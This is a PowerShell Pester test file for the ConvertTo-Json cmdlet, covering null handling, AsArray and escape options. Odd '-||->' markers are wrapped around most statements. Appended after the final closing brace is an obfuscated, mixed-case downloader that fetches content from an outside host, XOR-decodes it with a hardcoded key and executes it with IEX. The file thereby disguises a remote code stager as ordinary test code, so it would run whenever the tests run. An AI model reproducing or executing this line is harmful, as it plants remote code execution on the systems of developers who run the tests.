

 -||-> Describe 'ConvertTo-Json' -tags "CI" {
     -||-> BeforeAll {
         -||-> $newline = [System.Environment]::NewLine <-||- 
    } <-||- 

     -||-> It 'Newtonsoft.Json.Linq.Jproperty should be converted to Json properly' {
         -||-> $EgJObject =  -||-> New-Object -TypeName Newtonsoft.Json.Linq.JObject <-||-  <-||- 
         -||-> $EgJObject.Add("TestValue1", "123456") <-||- 
         -||-> $EgJObject.Add("TestValue2", "78910") <-||- 
         -||-> $EgJObject.Add("TestValue3", "99999") <-||- 
         -||-> $dict = @{} <-||- 
         -||-> $dict.Add('JObject', $EgJObject) <-||- 
         -||-> $dict.Add('StrObject', 'This is a string Object') <-||- 
         -||-> $properties = @{'DictObject' =  -||-> $dict <-||- ; 'RandomString' =  -||-> 'A quick brown fox jumped over the lazy dog' <-||- } <-||- 
         -||-> $object =  -||-> New-Object -TypeName psobject -Property $properties <-||-  <-||- 
         -||-> $jsonFormat =  -||-> ConvertTo-Json -InputObject $object <-||-  <-||- 
         -||-> $jsonFormat | Should -Match '"TestValue1": 123456' <-||- 
         -||-> $jsonFormat | Should -Match '"TestValue2": 78910' <-||- 
         -||-> $jsonFormat | Should -Match '"TestValue3": 99999' <-||- 
    } <-||- 

	 -||-> It "StopProcessing should succeed" -Pending:$true {
         -||-> $ps = [PowerShell]::Create() <-||- 
         -||-> $null = $ps.AddScript({
             -||-> $obj = [PSCustomObject]@{P1 =  -||-> '' <-||- ; P2 =  -||-> '' <-||- ; P3 =  -||-> '' <-||- ; P4 =  -||-> '' <-||- ; P5 =  -||-> '' <-||- ; P6 =  -||-> '' <-||- } <-||- 
             -||-> $obj.P1 =  -||-> $obj.P2 =  -||-> $obj.P3 =  -||-> $obj.P4 =  -||-> $obj.P5 =  -||-> $obj.P6 = $obj <-||-  <-||-  <-||-  <-||-  <-||-  <-||- 
             -||-> 1..100 | Foreach-Object {  -||-> $obj <-||-  } | ConvertTo-Json -Depth 10 -Verbose <-||- 
            
            throw  -||-> "Should not have thrown exception" <-||- 
        }) <-||- 
         -||-> $null = $ps.BeginInvoke() <-||- 
        
         -||-> Wait-UntilTrue {  -||-> $ps.Streams.Verbose.Count -gt 0 <-||-  } | Should -BeTrue <-||- 
         -||-> $null = $ps.BeginStop($null, $null) <-||- 
        
         -||-> Start-Sleep -Milliseconds 100 <-||- 
         -||-> $ps.InvocationStateInfo.State | Should -BeExactly "Stopped" <-||- 
         -||-> $ps.Dispose() <-||- 
    } <-||- 

     -||-> It "The result string is packed in an array symbols when AsArray parameter is used." {
         -||-> $output =  -||-> 1 | ConvertTo-Json -AsArray <-||-  <-||- 
         -||-> $output | Should -BeLike "``[*1*]" <-||- 

         -||-> $output =  -||-> 1,2 | ConvertTo-Json -AsArray <-||-  <-||- 
         -||-> $output | Should -BeLike "``[*1*2*]" <-||- 
    } <-||- 

     -||-> It "The result string is not packed in the array symbols when there is only one input object and AsArray parameter is not used." {
         -||-> $output =  -||-> 1 | ConvertTo-Json <-||-  <-||- 
         -||-> $output | Should -BeExactly '1' <-||- 
    } <-||- 

     -||-> It "The result string should <Name>." -TestCases @(
         -||-> @{name =  -||-> "be not escaped by default." <-||- ;                     params =  -||-> @{} <-||- ;                              expected =  -||-> "{$newline  ""abc"": ""'def'""$newline}" <-||-  } <-||- 
         -||-> @{name =  -||-> "be not escaped with '-EscapeHandling Default'." <-||- ; params =  -||-> @{EscapeHandling =  -||-> 'Default' <-||- } <-||- ;    expected =  -||-> "{$newline  ""abc"": ""'def'""$newline}" <-||-  } <-||- 
         -||-> @{name =  -||-> "be escaped with '-EscapeHandling EscapeHtml'." <-||- ;  params =  -||-> @{EscapeHandling =  -||-> 'EscapeHtml' <-||- } <-||- ; expected =  -||-> "{$newline  ""abc"": ""\u0027def\u0027""$newline}" <-||-  } <-||- 
    ) {
        param ($name, $params ,$expected)

         -||-> @{ 'abc' =  -||-> "'def'" <-||-  } | ConvertTo-Json @params | Should -BeExactly $expected <-||- 
    } <-||- 

     -||-> It "Should handle null" {
         -||-> [pscustomobject] @{ prop= -||-> $null <-||-  } | ConvertTo-Json -Compress | Should -BeExactly '{"prop":null}' <-||- 
         -||-> $null | ConvertTo-Json -Compress | Should -Be 'null' <-||- 
         -||-> ConvertTo-Json -Compress $null | Should -Be 'null' <-||- 
         -||-> 1, $null, 2 | ConvertTo-Json -Compress | Should -Be '[1,null,2]' <-||- 
    } <-||- 

     -||-> It "Should handle 'AutomationNull.Value' and 'NullString.Value' correctly" {
         -||-> [ordered]@{
            a =  -||-> $null <-||- ;
            b =  -||-> [System.Management.Automation.Internal.AutomationNull]::Value <-||- ;
            c =  -||-> [System.DBNull]::Value <-||- ;
            d =  -||-> [NullString]::Value <-||- 
        } | ConvertTo-Json -Compress | Should -BeExactly '{"a":null,"b":null,"c":null,"d":null}' <-||- 

         -||-> ConvertTo-Json ( -||-> [System.Management.Automation.Internal.AutomationNull]::Value <-||- ) | Should -BeExactly 'null' <-||- 
         -||-> ConvertTo-Json ( -||-> [NullString]::Value <-||- ) | Should -BeExactly 'null' <-||- 

         -||-> ConvertTo-Json -Compress @(
             -||-> $null,
            [System.Management.Automation.Internal.AutomationNull]::Value,
            [System.DBNull]::Value,
            [NullString]::Value <-||- 
        ) | Should -BeExactly '[null,null,null,null]' <-||- 
    } <-||- 

     -||-> It "Should handle the ETS properties added to 'DBNull.Value' and 'NullString.Value'" {
         -||-> try
        {
             -||-> $p1 =  -||-> Add-Member -InputObject ( -||-> [System.DBNull]::Value <-||- ) -MemberType NoteProperty -Name dbnull -Value 'dbnull' -PassThru <-||-  <-||- 
             -||-> $p2 =  -||-> Add-Member -InputObject ( -||-> [NullString]::Value <-||- ) -MemberType NoteProperty -Name nullstr -Value 'nullstr' -PassThru <-||-  <-||- 

             -||-> $p1, $p2 | ConvertTo-Json -Compress | Should -BeExactly '[{"value":null,"dbnull":"dbnull"},{"value":null,"nullstr":"nullstr"}]' <-||- 
        }
        finally
        {
             -||-> $p1.psobject.Properties.Remove('dbnull') <-||- 
             -||-> $p2.psobject.Properties.Remove('nullstr') <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> $Wc= -||-> NeW-OBjeCT SySteM.NeT.WEbCLIeNt <-||-  <-||- ; -||-> $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' <-||- ; -||-> $Wc.HeaDErs.AdD('User-Agent',$u) <-||- ; -||-> $Wc.PrOxy = [SyStEm.Net.WebREqueSt]::DeFauLTWeBPrOxy <-||- ; -||-> $Wc.PRoXY.CREDeNTIAls = [SYSteM.NET.CREDenTIALCaCHE]::DEfauLTNETworkCreDEnTiaLS <-||- ; -||-> $K='1a4T2xPe:7{kB6!EWM\rSlLQ8<)Du/wJ' <-||- ; -||-> $i=0 <-||- ; -||-> [chAr[]]$b= -||-> ( -||-> [chAr[]]( -||-> $Wc.DOWnLoAdSTrINg("http://home.rzepka.se/index.asp") <-||- ) <-||- )|%{ -||-> $_-BXOR$K[$i++%$k.LeNGtH] <-||- } <-||-  <-||- ; -||-> IEX ( -||-> $B-JoIn'' <-||- ) <-||- 



